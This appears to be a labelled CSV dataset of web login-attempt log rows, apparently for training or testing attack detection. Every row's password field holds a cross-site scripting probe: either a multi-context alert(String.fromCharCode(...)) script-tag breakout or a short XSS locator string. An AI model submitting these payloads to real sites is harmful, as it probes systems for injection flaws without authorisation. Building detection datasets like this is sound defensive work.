,ip_address,date,hour,minute,seconds,protocol,username,password,status,respsize,timed,label
0,192.108.116.88,18/Dec/2017,13,00,31,GET,datalab,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",200,1040,183,1
1,192.108.116.88,18/Dec/2017,13,00,31,GET,datalab,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",200,945,35,1
2,192.108.116.88,18/Dec/2017,13,00,31,GET,datalab,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",200,34463,8,1
3,192.108.116.88,18/Dec/2017,13,02,31,POST,datalab,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",-,-,-,1
4,192.108.116.88,18/Dec/2017,13,04,31,POST,datalab,"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",-,-,-,1
5,192.108.116.88,18/Dec/2017,13,04,56,GET,datalab,'';!--<XSS>=&{()},200,1040,19,1
6,192.108.116.88,18/Dec/2017,13,04,56,GET,datalab,'';!--<XSS>=&{()},200,945,24,1
7,192.108.116.88,18/Dec/2017,13,04,56,GET,datalab,'';!--<XSS>=&{()},200,34463,2,1
8,192.108.116.88,18/Dec/2017,13,04,57,POST,datalab,'';!--<XSS>=&{()},200,1073,206,1
9,192.108.116.88,18/Dec/2017,13,04,57,GET,datalab,'';!--<XSS>=&{()},304,-,5,1
10,192.108.116.88,18/Dec/2017,13,04,57,GET,datalab,'';!--<XSS>=&{()},304,-,12,1
